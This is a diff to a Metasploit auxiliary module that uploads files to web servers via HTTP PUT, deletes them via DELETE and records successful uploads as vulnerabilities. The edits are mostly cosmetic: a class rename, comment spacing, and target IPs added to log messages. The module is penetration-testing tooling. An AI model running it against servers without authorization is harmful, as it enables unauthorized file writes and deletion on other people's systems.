@@ -1,11 +1,11 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 
-class Metasploit4 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::WmapScanDir
@@ -54,7 +54,7 @@ class Metasploit4 < Msf::Auxiliary
   # Send a normal HTTP request and see if we successfully uploaded or deleted a file.
   # If successful, return true, otherwise false.
   #
-  def file_exists(path, data)
+  def file_exists(path, data, ip)
     begin
       res = send_request_cgi(
         {
@@ -65,7 +65,7 @@ class Metasploit4 < Msf::Auxiliary
         }, 20
       ).to_s
     rescue ::Exception => e
-      print_error("Error: #{e.to_s}")
+      print_error("#{ip}: Error: #{e.to_s}")
       return nil
     end
 
@@ -75,7 +75,7 @@ class Metasploit4 < Msf::Auxiliary
   #
   # Do a PUT request to the server.  Function returns the HTTP response.
   #
-  def do_put(path, data)
+  def do_put(path, data, ip)
     begin
       res = send_request_cgi(
         {
@@ -86,7 +86,7 @@ class Metasploit4 < Msf::Auxiliary
         }, 20
       )
     rescue ::Exception => e
-      print_error("Error: #{e.to_s}")
+      print_error("#{ip}: Error: #{e.to_s}")
       return nil
     end
 
@@ -96,7 +96,7 @@ class Metasploit4 < Msf::Auxiliary
   #
   # Do a DELETE request. Function returns the HTTP response.
   #
-  def do_delete(path)
+  def do_delete(path, ip)
     begin
       res = send_request_cgi(
         {
@@ -106,7 +106,7 @@ class Metasploit4 < Msf::Auxiliary
         }, 20
       )
     rescue ::Exception => e
-      print_error("Error: #{e.to_s}")
+      print_error("#{ip}: Error: #{e.to_s}")
       return nil
     end
 
@@ -128,18 +128,18 @@ class Metasploit4 < Msf::Auxiliary
 
     case action.name
     when 'PUT'
-      #Append filename if there isn't one
+      # Append filename if there isn't one
       if path !~ /(.+\.\w+)$/
         path << "#{Rex::Text.rand_text_alpha(5)}.txt"
         vprint_status("No filename specified. Using: #{path}")
       end
 
-      #Upload file
-      res = do_put(path, data)
-      vprint_status("Reply: #{res.code.to_s}") if not res.nil?
+      # Upload file
+      res = do_put(path, data, ip)
+      vprint_status("#{ip}: Reply: #{res.code.to_s}") if not res.nil?
 
-      #Check file
-      if not res.nil? and file_exists(path, data)
+      # Check file
+      if not res.nil? and file_exists(path, data, ip)
         turl = "#{(ssl ? 'https' : 'http')}://#{ip}:#{rport}#{path}"
         print_good("File uploaded: #{turl}")
         report_vuln(
@@ -152,26 +152,26 @@ class Metasploit4 < Msf::Auxiliary
           :exploited_at => Time.now.utc
         )
       else
-        print_error("File doesn't seem to exist. The upload probably failed.")
+        print_error("#{ip}: File doesn't seem to exist. The upload probably failed.")
       end
 
     when 'DELETE'
-      #Check file before deleting
+      # Check file before deleting
       if path !~ /(.+\.\w+)$/
         print_error("You must supply a filename")
         return
-      elsif not file_exists(path, data)
+      elsif not file_exists(path, data, ip)
         print_error("File is already gone. Will not continue DELETE")
         return
       end
 
-      #Delete our file
-      res = do_delete(path)
-      vprint_status("Reply: #{res.code.to_s}") if not res.nil?
+      # Delete our file
+      res = do_delete(path, ip)
+      vprint_status("#{ip}: Reply: #{res.code.to_s}") if not res.nil?
 
-      #Check if DELETE was successful
-      if res.nil? or file_exists(path, data)
-        print_error("DELETE failed. File is still there.")
+      # Check if DELETE was successful
+      if res.nil? or file_exists(path, data, ip)
+        print_error("#{ip}: DELETE failed. File is still there.")
       else
         turl = "#{(ssl ? 'https' : 'http')}://#{ip}:#{rport}#{path}"
         print_good("File deleted: #{turl}")
